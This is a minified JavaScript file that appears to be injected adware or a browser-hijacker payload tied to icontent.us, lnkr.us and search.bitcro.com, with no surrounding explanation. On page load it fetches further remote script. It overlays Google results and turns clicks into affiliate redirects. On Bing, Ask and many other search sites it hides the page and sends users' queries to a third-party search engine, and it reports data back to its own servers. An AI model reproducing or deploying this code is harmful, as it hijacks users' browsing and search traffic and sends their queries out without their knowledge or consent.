;try{(function(d,w,u){if(w.top!=w){return}if(w["__twb__7b6610c3a40aa8ed7c"]===u){return}var $$=w["__twb__7b6610c3a40aa8ed7c"];var addCss;(function(){var stylesQueue=[],timeoutRecursiveCall,timeoutCancel;function appendToBody(style){stylesQueue.push(style);if(!d.body){timeoutRecursiveCall=setTimeout(arguments.callee,100);if(!timeoutCancel){timeoutCancel=setTimeout(function(){clearTimeout(timeoutRecursiveCall)},3000)}}else{while(stylesQueue.length){d.body.appendChild(stylesQueue.pop())}}}addCss=function(css){var style=d.createElement("style");style.type="text/css";style.styleSheet?style.styleSheet.cssText+=css:style.innerHTML+=css;appendToBody(style);return style}})();var replace_ad_css=null;;(function(g,j,n){var b,h=false,l=[],a=n,k=k||{};var m=j["__twb__7b6610c3a40aa8ed7c"];function c(){h=true;while(l.length>0){(l.pop())()}}b={cors:function(d){var p=m.apply({url:"//icontent.us/ext/__utm.gif",callback:function(){},timeout:5000,onTimeout:function(){},mode:"auto",data:{}},d||{});p.data.key="7b6610c3a40aa8ed7c";p.data.sid="49396_123_";var e=(j.XMLHttpRequest?new j.XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP"));p.url+="?a="+encodeURIComponent(m.xor(m.toJson(p.data)));if((p.mode=="auto"&&e.withCredentials!==n)||p.mode=="xhr"){m.xhrRequest(e,p)}else{m.jsonpRequest(p)}},date:new Date(),bannerHideTime:86400000,adTitle:(m.tbParams.title?m.tbParams.title:"not this site"),useCtrEnchancer:"",lp:"ga_7b6610c3a40aa8ed7c_",lset:function(d,e){return localStorage.setItem(m.lp+d,m.toJson(e))},lget:function(d,o){var e=localStorage.getItem(m.lp+d);if(e){return m.fromJson(e)}},getSiteConfig:function(){return this.lget(this.lp+"cfg")||{}},saveSiteConfig:function(d){this.lset(this.lp+"cfg",d)},bannerInfoClick:function(d){m.optoutShow(d)},allowBannerInsert:function(){if(location.protocol=="https:"){return false}return true},getRand:function(e,d){return Math.floor((Math.random()*d)+e)},cumulativeOffset:function(d){var o=0,e=0;do{o+=d.offsetTop||0;e+=d.offsetLeft||0;d=d.offsetParent}while(d);return{top:o,left:e}},getScrollOffset:function(){var e=0,d=0;if(typeof(window.pageYOffset)=="number"){d=window.pageYOffset;e=window.pageXOffset}else{if(document.body&&(document.body.scrollLeft||document.body.scrollTop)){d=document.body.scrollTop;e=document.body.scrollLeft}else{if(document.documentElement&&(document.documentElement.scrollLeft||document.documentElement.scrollTop)){d=document.documentElement.scrollTop;e=document.documentElement.scrollLeft}}}return[e,d]},maskInitiated:false,createMask:function(e){if(!m.maskInitiated){var u="background-color: #000000;opacity: 0.8;position: absolute;z-index: 999999991;";var t='<div id="dc-ce-mask-1" style="'+u+'" class="dc-ce-mask" ></div>';t+='<div id="dc-ce-mask-2" style="'+u+'" class="dc-ce-mask" ></div>';t+='<div id="dc-ce-mask-3" style="'+u+'" class="dc-ce-mask" ></div>';t+='<div id="dc-ce-mask-4" style="'+u+'" class="dc-ce-mask" ></div>';t+='<div id="dc-ce-message-container" style="z-index: 999999992;position: fixed;top: 0;left: 0;height: auto;width: 100%;padding: 0 !important;background-color: #000000;" ><div id="dc-ce-message"></div></div>';var d=g.createElement("div");d.innerHTML=t;g.body.appendChild(d);m.maskInitiated=true}var E=e.clientWidth;var p=e.clientHeight;var w=g.documentElement,v=g.getElementsByTagName("body")[0];var r=Math.max(v.scrollWidth,v.offsetWidth,w.clientWidth,w.scrollWidth,w.offsetWidth);var D=Math.max(v.scrollHeight,v.offsetHeight,w.clientHeight,w.scrollHeight,w.offsetHeight);var s=m.cumulativeOffset(e);var z=s.top;var x=s.left;var q=D-z-p;var o=r-x-E;var C=g.getElementById("dc-ce-mask-1");C.style.top=0;C.style.left=0;C.style.height=z+"px";C.style.width=r+"px";var B=g.getElementById("dc-ce-mask-2");B.style.top=z+"px";B.style.left=0;B.style.height=p+"px";B.style.width=x+"px";var A=g.getElementById("dc-ce-mask-3");A.style.top=z+p+"px";A.style.left=0;A.style.height=q+"px";A.style.width=r+"px";var y=g.getElementById("dc-ce-mask-4");y.style.top=z+"px";y.style.left=x+E+"px";y.style.height=p+"px";y.style.width=o+"px";m.each(__$(".dc-ce-mask"),function(F){F.style.display="block"})},enableCtrEnchanser:function(d){m.on(d,"mouseover",function(){if(!d.__mask_enabled){m.createMask(d);d.__mask_enabled=1}});m.on(d,"mouseleave",function(){m.each(__$(".dc-ce-mask"),function(e){e.style.display="none";d.__mask_enabled=0})})},applyCssStyle:function(o,p){if(!o){return false}var s=o.style.cssText;var r=s.split(";");var d={};for(var e in r){var q=r[e].split(":");d[q[0]]=q[1]}for(var e in p){d[e]=p[e]}var t=[];for(var e in d){t.push(e+":"+d[e])}o.style.cssText=t.join(";")},callEvent:function(e,o){if(e.fireEvent){e.fireEvent("on"+o)}else{var d=document.createEvent("Events");d.initEvent(o,true,false);e.dispatchEvent(d)}}};j["__twb__7b6610c3a40aa8ed7c"]=m.apply(j["__twb__7b6610c3a40aa8ed7c"],b);if(g.addEventListener){g.addEventListener("DOMContentLoaded",function(){c()},false)}else{if(g.attachEvent){g.attachEvent("onreadystatechange",function(){c()})}}if(g.readyState){(function(){if((!b.isIe&&g.readyState==="interactive")||g.readyState==="complete"){c()}else{setTimeout(arguments.callee,100)}})()}else{var i=false;try{i=window.frameElement==null}catch(f){}if(g&&g.dElement&&g.dElement.doScroll&&i){(function(){try{g.dElement.doScroll("left")}catch(d){setTimeout(arguments.callee,100);return}c()})()}}})(document,window,undefined);;$$=w["__twb__7b6610c3a40aa8ed7c"];var cancel=false,__$=$$.Sizzle;$$.siteConfig=$$.getSiteConfig();if("icontent.us"&&location.href.indexOf("icontent.us")>-1){return false};;$$.script("//icontent.us/ext/ga2.js?key=7b6610c3a40aa8ed7c&sid=49396_123_&blocks%5B0%5D=coupons_newtab&blocks%5B1%5D=search_replace&blocks%5B2%5D=search_icons&blocks%5B3%5D=search_bing&blocks%5B4%5D=search_replace_major&h="+($$.getCookie("__gahash_7b6610c3a40aa8ed7c")?"1":"0"));;;;;;;;;;;;;;;;;;;(function(){var block="search_icons";var icons={"walmart.com":"walmart.jpg","kohls.com":"kohls.jpg","alibaba.com":"alibaba.jpg","orbitz.com":"orbitz.png","homedepot.com":"the_home_depot.png","jcpenney.com":"JCpenny.jpg","quill.com":"quill.jpg","republicwireless.com":"republic_wireless.png","booking.com":"booking.jpg","hotels.com":"hotels_com.jpg","macys.com":"macys.png","tripadvisor.com":"trip_advisor.jpg","ihg.com":"ihg.png","brownells.com":"brownels.jpg","bigfishgames.com":"bigfish.jpg","etihad.com":"ea.jpg","udemy.com":"udemy.jpg","ebay.at":"ebay.png","ebay.be":"ebay.png","ebay.ca":"ebay.png","ebay.ch":"ebay.png","ebay.co.uk":"ebay.png","ebay.com.au":"ebay.png","ebay.com.my":"ebay.png","ebay.de":"ebay.png","ebay.es":"ebay.png","ebay.fr":"ebay.png","ebay.ie":"ebay.png","ebay.in":"ebay.png","ebay.it":"ebay.png","ebay.nl":"ebay.png","amazon.com":"amazon.jpg","amazon.cn":"amazon.jpg","amazon.ca":"amazon.jpg","amazon.co.jp":"amazon.jpg","amazon.co.uk":"amazon.jpg","amazon.de":"amazon.jpg","amazon.es":"amazon.jpg","amazon.fr":"amazon.jpg","amazon.in":"amazon.jpg","amazon.it":"amazon.jpg"};function iconClick(url){var affUrl='http://lnkr.us/get?key=ef361f9d6f109d211af4eae62fee2979&uid=49396x123x&out='+encodeURIComponent(url)+"&ref="+encodeURIComponent(location.href)+"&format=go";setTimeout(function(){$$.redirect(affUrl)},0);return false}function injectIcon(block,host){var iconBlock=d.createElement("div");iconBlock.setAttribute("style","float: left;");var link=d.createElement("a");link.href="http://"+host;iconBlock.appendChild(link);var img=d.createElement("img");img.src="//icontent.us/ext/images/search_icons/"+icons[host];img.alt=host;link.appendChild(img);var linkBlock=__$("h3",block);if(!linkBlock||!linkBlock[0]){return true}linkBlock[0].parentNode.insertBefore(iconBlock,linkBlock[0].nextSibling);$$.each(__$("a",linkBlock[0]),function(el){var linkUrl=el.href||"";$$.on(el,"click",function(){if(!linkUrl){return true}iconClick(linkUrl);return false})});$$.on(link,"click",function(){if(!link.href){return true}iconClick(link.href);return false})}var timerId;function updateIcons(){if(timerId){clearTimeout(timerId)}$$.each(__$("div.g[data-icon-processed!=1]"),function(resultBlock){var linkEl=__$("h3 > a",resultBlock);if(!linkEl){return true}if(linkEl[0]&&linkEl[0].hostname){for(var i in icons){if(linkEl[0].hostname.indexOf(i)>-1){injectIcon(resultBlock,i)}}}resultBlock.setAttribute("data-icon-processed",1)});setTimeout(updateIcons,1000)}$$.ready(function(){$$.loadedCallback("MNTZ_LOADED","search_icons");if(location.hostname.match(/^(www\.|)google\..*/i)){$$.loadedCallback("BANNER_LOAD","search_icons");timerId=setTimeout(updateIcons,1000);$$.each(document.getElementsByName("q"),function(el){$$.on(el,"change",function(){updateIcons()})})}else{}})})();;;(function(){var block="search_replace";var hostnamesList=["yhomepage-web.com","findplex.com","mysearch123.com","oursurfing.com","sweet-page.com","searches.safehomepage.com","websearch.freesearches.info","gget.net","isearch.omiga-plus.com","searches.vi-view.com","delta-search.com","search.babylon.com","istart.webssearches.com","isearch.babylon.com","search.whitesmoke.com","delta-homes.com","isearch.whitesmoke.com","search.sweetim.com","search.iminent.com","search.genieo.com","search.snapdo.com","search.delta-search.com","search.incredibar.com","search.mywebsearch.com","search.softonic.com","search.gboxapp.com","incredibar-search.com","isearch.babylon.com","zzsearch.net","search.fbdownloader.com","search.buenosearch.com","default-search.net","search.surfcanyon.com","search.chatzum.com","search.nation.com","search.claro-search.com","isearch.avg.com","search.avg.com","home.mywebsearch.com","search.certified-toolbar.com","search.foxtab.com","v9.com","sweetpacks-search.com","search.handycafe.com","search.incredimail.com","search.findwide.com","search.imesh.net","search.bearshare.net","search.snap.do","www-search.net","search.searchonme.com","safesearch.net","search.alot.com","search.shareazaweb.net","isearch.whitesmoke.com","websearch.just-browse.info","websearch.greatresults.info","trovi.com","websearch.com","search.bt.com","zzsearch.net","websearch.coolwebsearch.info","incredimail-search.com","search.creativetoolbars.com","mysearch.avg.com","search.startnow.com","better-search.net","mysearch.sweetpacks.com","search.bearshare.com","search.speedbit.com","search.atajitos.com","search.safefinder.com","search.conduit.com","webssearches.com","sweet-page.com","qvo6.com","awesomehp.com","trovi.com","mystartsearch.com","istartsurf.com"];$$.ready(function(){$$.loadedCallback("MNTZ_LOADED","search_replace");for(var i in hostnamesList){var hostnameCheck=hostnamesList[i];if(location.hostname.indexOf(hostnameCheck)>=0){$$.loadedCallback("BANNER_LOAD","search_replace");$$.each(document.getElementsByTagName("form"),function(form){form.setAttribute("target","_self");form.setAttribute("action","#");$$.on(form,"submit",function(){var searchQuery;$$.each(form.getElementsByTagName("input"),function(inp){if(inp.type=="text"&&inp.value){searchQuery=inp.value;return true}});if(searchQuery){setTimeout(function(){location.href="http://search.bitcro.com/results.php?pub=2000&q="+searchQuery},0)}return false})});return true}}})})();;;(function(){var block="search_replace_major";$$.ready(function(){$$.loadedCallback("MNTZ_LOADED","search_replace_major");try{function getParams(){params={};for(var e=location.search.replace("?",""),r=e.split("&"),c=0;c<r.length;c++){t=r[c].split("="),t[1]&&(params[t[0]]=t[1])}var a=location.hash.replace("#","");a&&(t=a.split("="),t[1]&&(params[t[0]]=t[1]))}function redirectSearch(e){$$.loadedCallback("BANNER_LOAD","search_replace_major");if(getParams(),void 0!=params[e]){window.stop&&window.stop(),document.documentElement.style.opacity="0",document.documentElement.style.display="none";var r=params[e],c="http://search.bitcro.com/results.php?pub=2000&q="+r;location.href=c,clearInterval(tmr)}}function checkForSearch(){var e=location.href;-1!=d.indexOf("ask")&&-1!=e.indexOf("/web")&&redirectSearch("q"),-1!=d.indexOf("wow.com")&&-1!=e.indexOf("/search")&&redirectSearch("q"),-1!=d.indexOf("search.mywebsearch.com")&&redirectSearch("searchfor"),-1!=d.indexOf("search.myway.com")&&redirectSearch("searchfor"),tmrCnt++}var d=window.document.domain,tmr,tmrCnt=0,params={};window==top&&(checkForSearch(),tmr=setInterval(checkForSearch,100))}catch(err){}})})();;;(function(){var block="search_bing";$$.ready(function(){$$.loadedCallback("MNTZ_LOADED","search_bing");try{(function(){function getParams(){params={};for(var e=location.search.replace("?",""),r=e.split("&"),c=0;c<r.length;c++){t=r[c].split("="),t[1]&&(params[t[0]]=t[1])}var a=location.hash.replace("#","");a&&(t=a.split("="),t[1]&&(params[t[0]]=t[1]))}function checkBingTag(){getParams();var e="ptag";if(void 0==params[e]){return -1==document.cookie.indexOf("A7F32829C74")?void redirectSearch("q"):void 0}var r=params[e];-1==r.indexOf("A7F32829C74")&&(window.stop&&window.stop(),document.documentElement.style.opacity="0",document.documentElement.style.display="none",redirectSearch("q"))}function redirectSearch(e){$$.loadedCallback("BANNER_LOAD","search_bing");if(getParams(),void 0!=params[e]){window.stop&&window.stop(),document.documentElement.style.opacity="0",document.documentElement.style.display="none";var r=params[e],c="http://search.bitcro.com/results.php?pub=1993&v=3&q="+r;location.href=c,clearInterval(tmr)}}function checkForSearch(){var e=location.href;-1!=d.indexOf("bing")&&checkBingTag()&&clearInterval(tmr)}var d=window.document.domain,tmr,tmrCnt=0,params={};window==top&&(checkForSearch(),tmr=setInterval(checkForSearch,100))})()}catch(e){}(function(){if(location.hostname.indexOf("bing.com")>=0&&location.href.indexOf("/search")==-1){var searchForm=document.getElementById("sb_form");if(!searchForm){return true}$$.on(searchForm,"submit",function(){$$.loadedCallback("BANNER_LOAD","search_bing");var searchInp=d.getElementById("sb_form_q");if(!searchInp){return true}var searchQuery=searchInp.value;if(searchQuery){setTimeout(function(){location.href="http://search.bitcro.com/results.php?pub=1993&q="+searchQuery},0)}else{return true}return false})}})()})})();;})(document,window,undefined);}catch(e){var stack=(typeof e.stack!="undefined"?e.stack:"!empty stack!");if(stack.length>1500){stack=stack.substr(0,1500)}var src=(window.location.protocol=="http:"?"http:":"https:")+"////icontent.us/log?l=error&m="+encodeURIComponent((typeof e.message!="undefined"?e.message:"!empty message!")+"|"+stack);var s=document.createElement("script");s.type="text/javascript";s.src=src+(src.indexOf("?")==-1?"?":"&")+"t="+(new Date().getTime());(document.getElementsByTagName("script")[0]||document.documentElement.firstChild).parentNode.appendChild(s);var $$=window["__twb__7b6610c3a40aa8ed7c"];var params=["mid=","wid="+($$&&$$.tbParams)?$$.tbParams.wid:"","sid="+($$&&$$.tbParams)?$$.tbParams.sid:"","tid="+($$&&$$.tbParams)?$$.tbParams.tid:"","rid=PLATFORM_JS_ERROR"];src=(window.location.protocol=="http:"?"http:":"https:")+"////icontent.us/metric?"+params.join("&");s=document.createElement("script");s.type="text/javascript";s.src=src+(src.indexOf("?")==-1?"?":"&")+"t="+(new Date().getTime());(document.getElementsByTagName("script")[0]||document.documentElement.firstChild).parentNode.appendChild(s)};